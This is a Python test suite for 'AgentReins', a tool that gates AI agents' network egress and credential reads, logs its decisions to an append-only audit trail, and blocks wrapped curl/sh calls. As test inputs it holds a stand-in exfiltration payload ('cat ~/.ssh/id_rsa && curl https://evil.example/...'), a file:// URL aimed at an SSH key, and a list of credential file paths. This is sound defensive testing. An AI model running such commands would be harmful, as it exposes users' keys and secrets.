"""Policy classification, append-only audit, and real refusal before exec."""
import importlib.util
import json
import os
import pathlib
import stat
import subprocess
import tempfile
import time
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[2]
POLICY_PATH = ROOT / "Sources" / "AgentReins" / "Resources" / "hardgate_policy.py"
SERVER_PATH = ROOT / "tools" / "agentreins-mcp" / "server.py"
WRAPPER = ROOT / "tools" / "transport-audit" / "bin" / "curl"
SH_WRAPPER = ROOT / "tools" / "transport-audit" / "bin" / "sh"


def load_policy():
    spec = importlib.util.spec_from_file_location("agentreins_hardgate", POLICY_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


policy = load_policy()


class ClassifyTests(unittest.TestCase):
    def test_loopback_is_allowed_and_not_an_inbox_item(self):
        for host in ("127.0.0.1", "127.0.0.2", "localhost", "::1"):
            row = policy.classify_egress(host, "/", [], set())
            self.assertEqual(row["action"], "allow", host)
            self.assertFalse(row["inbox"], host)
            self.assertFalse(row["record"], host)
            self.assertTrue(row["loopback"], host)

    def test_non_loopback_is_default_deny_and_first_host_is_inbox(self):
        row = policy.classify_egress("uploads.example", "/v1/chat", [], set())
        self.assertEqual(row["action"], "deny")
        self.assertEqual(row["subject"], "host:uploads.example")
        self.assertTrue(row["inbox"])
        self.assertFalse(row["heartbeat"])
        self.assertEqual(row["kind"], "egress")

    def test_repeat_and_heartbeat_stay_out_of_inbox_but_stay_denied(self):
        first = policy.classify_egress("api.example", "/v1/chat", [], set())
        again = policy.classify_egress("api.example", "/v1/chat", [], {first["subject"]})
        self.assertFalse(again["inbox"])
        self.assertEqual(again["action"], "deny")
        beat = policy.classify_egress("api.example", "/health", [], set())
        self.assertEqual(beat["action"], "deny")
        self.assertTrue(beat["heartbeat"])
        self.assertFalse(beat["inbox"])
        beat_q = policy.classify_egress("api.example", "/health?ready=1", [], set())
        self.assertTrue(beat_q["heartbeat"])
        self.assertFalse(beat_q["inbox"])

    def test_allowlist_requires_user_and_reason(self):
        bare = [{"actor": "user", "subject": "host:github.com", "kind": "egress", "reason": "  "}]
        forged = [{"actor": "enforcer", "subject": "host:github.com", "kind": "egress", "reason": "no"}]
        real = [{"actor": "user", "subject": "host:github.com", "kind": "egress", "reason": "发布"}]
        self.assertEqual(policy.classify_egress("github.com", "/", bare, set())["action"], "deny")
        self.assertEqual(policy.classify_egress("github.com", "/", forged, set())["action"], "deny")
        passed = policy.classify_egress("github.com", "/", real, set())
        self.assertEqual(passed["action"], "pass")
        self.assertFalse(passed["inbox"])
        # A different host is not covered by an exact entry.
        self.assertEqual(policy.classify_egress("api.github.com", "/", real, set())["action"], "deny")

    def test_credential_paths(self):
        home = "/Users/dev"
        cwd = "/work/proj"
        args = [
            ".env",
            "~/.ssh/id_rsa",
            "~/.aws/credentials",
            "/Users/dev/Library/Keychains/login.keychain-db",
            "~/.config/gcloud/application_default_credentials.json",
            "~/.azure/accessTokens.json",
            "~/.config/gh/hosts.yml",
            "~/.kube/config",
            "~/.docker/config.json",
            "~/.netrc",
            "credentials.json",
            "secrets/api.pem",
            "security",
            "dump-keychain",
        ]
        subjects = policy.credential_subjects(args, cwd, home)
        joined = "\n".join(subjects)
        self.assertIn("path:/work/proj/.env", joined)
        self.assertIn("path:/users/dev/.ssh/id_rsa", joined)
        self.assertIn("path:/users/dev/.aws/credentials", joined)
        self.assertIn("path:/users/dev/library/keychains/login.keychain-db", joined)
        self.assertIn("path:/users/dev/.config/gcloud/application_default_credentials.json", joined)
        self.assertIn("path:/users/dev/.azure/accesstokens.json", joined)
        self.assertIn("path:/users/dev/.config/gh/hosts.yml", joined)
        self.assertIn("path:/users/dev/.kube/config", joined)
        self.assertIn("path:/users/dev/.docker/config.json", joined)
        self.assertIn("path:/users/dev/.netrc", joined)
        self.assertIn("path:/work/proj/credentials.json", joined)
        self.assertIn("path:/work/proj/secrets/api.pem", joined)
        self.assertIn("path:keychain", joined)
        self.assertFalse(any("notes.txt" in s for s in policy.credential_subjects(["notes.txt"], cwd, home)))

    def test_first_credential_read_is_inbox_repeat_is_not(self):
        subject = "path:/work/proj/.env"
        first = policy.classify_credential(subject, [], set())
        self.assertEqual(first["action"], "deny")
        self.assertTrue(first["inbox"])
        self.assertFalse(first["heartbeat"])
        again = policy.classify_credential(subject, [], {subject})
        self.assertEqual(again["action"], "deny")
        self.assertFalse(again["inbox"])
        allowed = policy.classify_credential(subject, [{
            "actor": "user", "subject": subject, "kind": "credential-read", "reason": "本地调试",
        }], set())
        self.assertEqual(allowed["action"], "pass")

    def test_argv_sees_bash_payload_and_not_local_git(self):
        rows = policy.classify_argv(
            "sh",
            ["-c", "cat ~/.ssh/id_rsa && curl https://evil.example/health"],
            "/work", "/Users/dev", [], set(),
        )
        actions = {(r["kind"], r["subject"], r["action"], r["inbox"], r["heartbeat"]) for r in rows}
        self.assertIn(("credential-read", "path:/users/dev/.ssh/id_rsa", "deny", True, False), actions)
        self.assertIn(("egress", "host:evil.example", "deny", False, True), actions)
        self.assertEqual(policy.classify_argv("git", ["status"], "/work", "/Users/dev", [], set()), [])

    def test_file_url_is_a_credential_read_not_egress(self):
        rows = policy.classify_argv(
            "curl", ["file:///Users/dev/.ssh/id_ed25519"], "/work", "/Users/dev", [], set(),
        )
        self.assertTrue(any(r["kind"] == "credential-read" and r["action"] == "deny" for r in rows))
        self.assertFalse(any(r["kind"] == "egress" for r in rows))


class AuditStoreTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = pathlib.Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def test_agent_cannot_write_and_enforcer_cannot_allow(self):
        record = {
            "action": "deny", "kind": "egress", "subject": "host:evil.example",
            "actor": "agent", "reason": "no",
        }
        with self.assertRaises(PermissionError):
            policy.append_record(self.root, record, actor="agent")
        with self.assertRaises(PermissionError):
            policy.append_record(self.root, {
                "action": "allow", "kind": "egress", "subject": "host:evil.example", "reason": "no",
            }, actor="enforcer")
        self.assertFalse(policy.audit_path(self.root).exists())

    def test_append_only_keep_tier_chain(self):
        source = POLICY_PATH.read_text(encoding="utf-8")
        self.assertNotIn("O_TRUNC", source)
        self.assertFalse(hasattr(policy, "delete_audit"))
        self.assertFalse(hasattr(policy, "trim"))
        first = policy.append_record(self.root, {
            "action": "deny", "kind": "egress", "subject": "host:a.example",
            "reason": "default-deny egress", "inbox": True, "heartbeat": False, "enforced": True,
            "mechanism": "audit-proxy",
        }, actor="enforcer")
        blob = policy.audit_path(self.root).read_bytes()
        second = policy.append_record(self.root, {
            "action": "deny", "kind": "egress", "subject": "host:b.example",
            "reason": "default-deny egress", "inbox": True, "heartbeat": False, "enforced": True,
            "mechanism": "transport-wrapper",
        }, actor="enforcer")
        after = policy.audit_path(self.root).read_bytes()
        self.assertTrue(after.startswith(blob))
        self.assertEqual(first["tier"], "keep")
        self.assertEqual(second["tier"], "keep")
        self.assertEqual(first["prev"], policy.ZERO_PREV)
        self.assertNotEqual(second["prev"], policy.ZERO_PREV)
        self.assertTrue(policy.verify_chain(after))
        mode = stat.S_IMODE(policy.audit_path(self.root).stat().st_mode)
        self.assertEqual(mode, 0o600)

    def test_user_allow_then_deny(self):
        with self.assertRaises(ValueError):
            policy.user_allow(self.root, "host:github.com", "egress", "  ")
        policy.user_allow(self.root, "host:github.com", "egress", "发布需要")
        allow = policy.load_allowlist(self.root)
        self.assertEqual(allow[0]["subject"], "host:github.com")
        self.assertEqual(allow[0]["actor"], "user")
        passed = policy.classify_egress("github.com", "/", allow, policy.seen_subjects(self.root))
        self.assertEqual(passed["action"], "pass")
        policy.user_deny(self.root, "host:github.com", "egress", "不再需要")
        self.assertEqual(policy.load_allowlist(self.root), [])
        denied = policy.classify_egress("github.com", "/", policy.load_allowlist(self.root), set())
        self.assertEqual(denied["action"], "deny")
        actions = [row["action"] for row in policy.load_rows(self.root) if row["actor"] == "user"]
        self.assertEqual(actions, ["allow", "deny"])

    def test_open_inbox_skips_heartbeats_repeats_and_decided(self):
        policy.append_record(self.root, {
            "action": "deny", "kind": "egress", "subject": "host:beat.example",
            "inbox": True, "heartbeat": True, "enforced": True, "mechanism": "audit-proxy",
            "reason": "default-deny egress",
        }, actor="enforcer")
        policy.append_record(self.root, {
            "action": "deny", "kind": "egress", "subject": "host:new.example",
            "inbox": True, "heartbeat": False, "enforced": True, "mechanism": "audit-proxy",
            "reason": "default-deny egress", "detail": "第一次外联到新主机",
        }, actor="enforcer")
        policy.append_record(self.root, {
            "action": "deny", "kind": "egress", "subject": "host:new.example",
            "inbox": False, "heartbeat": False, "enforced": True, "mechanism": "audit-proxy",
            "reason": "default-deny egress",
        }, actor="enforcer")
        policy.append_record(self.root, {
            "action": "deny", "kind": "credential-read", "subject": "path:/work/.env",
            "inbox": True, "heartbeat": False, "enforced": True, "mechanism": "transport-wrapper",
            "reason": "default-deny credential path",
        }, actor="enforcer")
        rows = policy.load_rows(self.root)
        open_rows = policy.open_inbox(rows, [])
        subjects = [r["subject"] for r in open_rows]
        self.assertEqual(subjects, ["host:new.example", "path:/work/.env"])
        policy.user_allow(self.root, "host:new.example", "egress", "这次可以")
        left = policy.open_inbox(policy.load_rows(self.root), policy.load_allowlist(self.root))
        self.assertEqual([r["subject"] for r in left], ["path:/work/.env"])

    def test_seed_default_deny_with_registries_and_model_hosts(self):
        self.assertTrue(policy.ensure_seeded(self.root))
        allow = policy.load_allowlist(self.root)
        subjects = {entry["subject"] for entry in allow}
        self.assertIn("host:github.com", subjects)
        self.assertIn("host:registry.npmjs.org", subjects)
        self.assertIn("host:pypi.org", subjects)
        self.assertIn("host:api.openai.com", subjects)
        self.assertIn("host:api.anthropic.com", subjects)
        self.assertEqual(policy.classify_egress("github.com", "/", allow, set())["action"], "pass")
        self.assertEqual(policy.classify_egress("uploads.example", "/", allow, set())["action"], "deny")
        self.assertEqual(policy.classify_credential("path:/work/proj/.env", allow, set())["action"], "deny")
        self.assertEqual(policy.classify_argv("git", ["config", "user.name"], "/work", "/home", allow, set()), [])
        self.assertEqual(policy.classify_argv("git", ["config", "--global", "user.email"], "/work", "/home", allow, set()), [])
        clone = policy.classify_argv("git", ["clone", "https://blocked.example/repo.git"], "/work", "/home", allow, set())
        self.assertEqual(clone[0]["subject"], "host:blocked.example")
        telemetry = policy.classify_egress("galileotelemetry.tencent.com", "/v1/report", allow, set())
        self.assertEqual(telemetry["action"], "deny")
        self.assertFalse(telemetry["inbox"])
        self.assertEqual(telemetry["noise"], "telemetry")
        self.assertFalse(policy.ensure_seeded(self.root))
        rules = self.root / "rules.json"
        self.assertTrue(policy.seed_rules_file(rules))
        doc = json.loads(rules.read_text(encoding="utf-8"))
        self.assertEqual({row["id"] for row in doc["rules"]}, {"default-deny-egress", "default-deny-credential-read"})
        self.assertTrue(all(row["action"] == "block" for row in doc["rules"]))
        empty = self.root / "empty.json"
        empty.write_text('{"version":1,"rules":[]}', encoding="utf-8")
        self.assertTrue(policy.seed_rules_file(empty))
        custom = self.root / "custom.json"
        custom.write_text('{"version":1,"customized":true,"rules":[]}', encoding="utf-8")
        self.assertFalse(policy.seed_rules_file(custom))
        self.assertEqual(json.loads(custom.read_text(encoding="utf-8"))["rules"], [])
        both = [self.root / "AgentReins" / "rules.json", self.root / "AgentGuard" / "rules.json"]
        both[0].parent.mkdir()
        both[0].write_text('{"version":1,"rules":[]}', encoding="utf-8")
        both[1].parent.mkdir()
        both[1].write_text('{"version":1,"customized":true,"rules":[]}', encoding="utf-8")
        self.assertTrue(policy.seed_installed_rules(both))
        self.assertFalse(policy.seed_installed_rules(both))
        seeded = json.loads(both[0].read_text(encoding="utf-8"))
        self.assertEqual({row["id"] for row in seeded["rules"]}, {"default-deny-egress", "default-deny-credential-read"})
        self.assertEqual(json.loads(both[1].read_text(encoding="utf-8"))["rules"], [])

    def test_mcp_server_has_no_hard_gate_write(self):
        text = SERVER_PATH.read_text(encoding="utf-8")
        self.assertNotIn("hardgate", text.lower())
        self.assertNotIn("allowlist", text.lower())


class EnforcementTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = pathlib.Path(self.tmp.name)
        self.home = self.root / "home"
        self.home.mkdir()
        self.transport = self.root / "transport"
        self.marker = self.root / "ran"

    def tearDown(self):
        self.tmp.cleanup()

    def _env(self, tool):
        fake = self.root / tool
        fake.write_text("#!/bin/sh\ntouch %s\n" % self.marker)
        fake.chmod(0o755)
        env = os.environ.copy()
        env["AGENTREINS_TRANSPORT_AGENT"] = "Cursor"
        env["AGENTREINS_HARDGATE_ROOT"] = str(self.root / "gate")
        env["AGENTREINS_TRANSPORT_ROOT"] = str(self.transport)
        env["AGENTREINS_REAL_%s" % tool.upper()] = str(fake)
        env["HOME"] = str(self.home)
        env.pop("AGENTREINS_HARDGATE_POLICY", None)
        return env

    def _wait_until_exec(self, argv, env):
        """Return once the real binary has run.

        The wrapper then signs evidence. On a cold CI keychain that wait is
        longer than the exec itself, so the marker is the proof, not process exit.
        """
        proc = subprocess.Popen(argv, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        try:
            deadline = time.time() + 20
            while time.time() < deadline:
                if self.marker.exists():
                    return 0
                if proc.poll() is not None:
                    err = proc.stderr.read() if proc.stderr else ""
                    self.assertEqual(proc.returncode, 0, err)
                    return proc.returncode
                time.sleep(0.05)
            self.fail("wrapper did not exec the real binary")
        finally:
            if proc.poll() is None:
                proc.kill()
                proc.wait(timeout=5)
            if proc.stdout:
                proc.stdout.close()
            if proc.stderr:
                proc.stderr.close()

    def test_wrapper_does_not_exec_denied_egress(self):
        env = self._env("curl")
        proc = subprocess.run(
            [str(WRAPPER), "https://blocked.example/secret"],
            env=env, capture_output=True, text=True, timeout=10,
        )
        self.assertEqual(proc.returncode, 126, proc.stderr)
        self.assertFalse(self.marker.exists())
        self.assertFalse(self.transport.exists())
        rows = policy.load_rows(self.root / "gate")
        self.assertTrue(rows)
        self.assertEqual(rows[0]["action"], "deny")
        self.assertEqual(rows[0]["subject"], "host:blocked.example")
        self.assertTrue(rows[0]["enforced"])
        self.assertEqual(rows[0]["mechanism"], "transport-wrapper")
        self.assertTrue(rows[0]["inbox"])
        self.assertEqual(rows[0]["tier"], "keep")
        self.assertIn("不会执行", proc.stderr)

    def test_installed_layout_blocks_without_the_agentspec_tree(self):
        """A fresh machine has no ~/AgentSpec checkout. The bundle copy must still deny."""
        installed = self.root / "Application Support" / "AgentReins" / "transport-audit"
        installed.mkdir(parents=True)
        (installed / "auto.py").write_bytes((ROOT / "tools" / "transport-audit" / "auto.py").read_bytes())
        (installed / "auto.py").chmod(0o755)
        (installed / "hardgate_policy.py").write_bytes(POLICY_PATH.read_bytes())
        (installed / "redact_secrets.py").write_bytes((ROOT / "tools" / "redact_secrets.py").read_bytes())
        (installed / "content_audit.py").write_bytes((ROOT / "Sources" / "AgentReins" / "Resources" / "content_audit.py").read_bytes())
        bindir = installed / "bin"
        bindir.mkdir()
        (bindir / "curl").symlink_to("../auto.py")
        env = self._env("curl")
        proc = subprocess.run(
            [str(bindir / "curl"), "https://blocked.example/secret"],
            env=env, capture_output=True, text=True, timeout=15,
        )
        self.assertEqual(proc.returncode, 126, proc.stderr)
        self.assertFalse(self.marker.exists())
        self.assertNotIn("AgentSpec", proc.stderr)
        rows = policy.load_rows(self.root / "gate")
        self.assertEqual(rows[0]["action"], "deny")
        self.assertEqual(rows[0]["mechanism"], "transport-wrapper")

    def test_wrapper_executes_loopback(self):
        env = self._env("curl")
        self.assertEqual(self._wait_until_exec([str(WRAPPER), "http://127.0.0.1:9/health"], env), 0)
        self.assertTrue(self.marker.exists())
        self.assertEqual(policy.load_rows(self.root / "gate"), [])

    def test_wrapper_blocks_ssh_read_and_second_time_is_not_inbox(self):
        env = self._env("sh")
        target = str(SH_WRAPPER)
        first = subprocess.run(
            [target, "-c", "cat ~/.ssh/id_rsa"],
            env=env, capture_output=True, text=True, timeout=10,
        )
        self.assertEqual(first.returncode, 126, first.stderr)
        self.assertFalse(self.marker.exists())
        rows = policy.load_rows(self.root / "gate")
        self.assertEqual(rows[0]["kind"], "credential-read")
        self.assertTrue(rows[0]["inbox"])
        self.assertTrue(rows[0]["enforced"])
        self.assertTrue(rows[0]["subject"].endswith("/.ssh/id_rsa"))
        second = subprocess.run(
            [target, "-c", "cat ~/.ssh/id_rsa"],
            env=env, capture_output=True, text=True, timeout=10,
        )
        self.assertEqual(second.returncode, 126, second.stderr)
        again = policy.load_rows(self.root / "gate")
        self.assertEqual(len(again), 2)
        self.assertFalse(again[1]["inbox"])
        self.assertTrue(again[1]["enforced"])

    def test_user_allow_lets_the_wrapper_exec(self):
        gate = self.root / "gate"
        policy.user_allow(gate, "host:allowed.example", "egress", "发布需要")
        env = self._env("curl")
        self.assertEqual(self._wait_until_exec([str(WRAPPER), "https://allowed.example/v1"], env), 0)
        self.assertTrue(self.marker.exists())
        passes = [r for r in policy.load_rows(gate) if r["action"] == "pass"]
        self.assertTrue(passes)
        self.assertFalse(passes[0]["enforced"])
        self.assertEqual(passes[0]["mechanism"], "transport-wrapper")

    def test_proxy_kill_is_enforced_and_a_miss_is_not(self):
        gate = self.root / "gate"

        class Flow:
            def __init__(self, host, path, kill=True):
                self.killed = False
                self.response = None
                self.metadata = {}
                self.request = type("R", (), {"pretty_host": host, "path": path, "host": host})()
                self.kill = self._kill if kill else None

            def _kill(self):
                self.killed = True

        blocked = Flow("evil.example", "/v1/chat")
        self.assertTrue(policy.enforce_proxy_flow(blocked, gate))
        self.assertTrue(blocked.killed)
        row = policy.load_rows(gate)[0]
        self.assertTrue(row["enforced"])
        self.assertEqual(row["mechanism"], "audit-proxy")
        self.assertTrue(row["inbox"])
        self.assertEqual(blocked.metadata["agentreins_hard_gate"]["enforced"], True)

        quiet = Flow("other.example", "/health", kill=False)
        # No kill and, in this environment, mitmproxy may be absent. Either way the
        # receipt must not claim enforcement unless a block call succeeded.
        denied = policy.enforce_proxy_flow(quiet, gate)
        self.assertTrue(denied)
        health = [r for r in policy.load_rows(gate) if r["subject"] == "host:other.example"][0]
        self.assertFalse(health["inbox"])
        self.assertTrue(health["heartbeat"])
        if quiet.response is None and not quiet.killed:
            self.assertFalse(health["enforced"])
            self.assertIsNone(health["mechanism"])

        loop = Flow("127.0.0.1", "/health")
        self.assertFalse(policy.enforce_proxy_flow(loop, gate))
        self.assertFalse(loop.killed)


class CaptureHookTests(unittest.TestCase):
    def test_addon_request_hook_kills_before_capture_needs_upstream(self):
        addon_path = ROOT / "Sources" / "AgentReins" / "Resources" / "workbuddy_network_capture.py"
        spec = importlib.util.spec_from_file_location("agentreins_capture_gate", addon_path)
        # Importing the addon reads its output paths at import time.
        out = tempfile.TemporaryDirectory()
        root = pathlib.Path(out.name)
        os.environ["AGENTREINS_WORKBUDDY_NETWORK_JSONL"] = str(root / "net.jsonl")
        os.environ["AGENTREINS_WORKBUDDY_ROUTE_JSONL"] = str(root / "route.jsonl")
        os.environ["AGENTREINS_HARDGATE_ROOT"] = str(root / "gate")
        os.environ["AGENTREINS_HARDGATE_POLICY"] = str(POLICY_PATH)
        try:
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
        finally:
            pass

        class Flow:
            def __init__(self):
                self.killed = False
                self.response = None
                self.metadata = {}
                self.id = "f1"
                self.request = type("R", (), {
                    "pretty_host": "blocked.example",
                    "host": "blocked.example",
                    "path": "/v1/chat",
                    "pretty_url": "https://blocked.example/v1/chat",
                    "method": "GET",
                    "http_version": "HTTP/1.1",
                    "headers": {},
                    "raw_content": b"",
                    "content": b"",
                })()
                self.client_conn = type("C", (), {"peername": ("127.0.0.1", 9), "sockname": ("127.0.0.1", 18891)})()
                self.server_conn = type("S", (), {"ip_address": None})()

            def kill(self):
                self.killed = True

            def get_content(self, strict=False):
                return b""

        flow = Flow()
        module.request(flow)
        self.assertTrue(flow.killed)
        rows = policy.load_rows(root / "gate")
        self.assertTrue(rows and rows[0]["enforced"] and rows[0]["mechanism"] == "audit-proxy")
        out.cleanup()


if __name__ == "__main__":
    unittest.main()
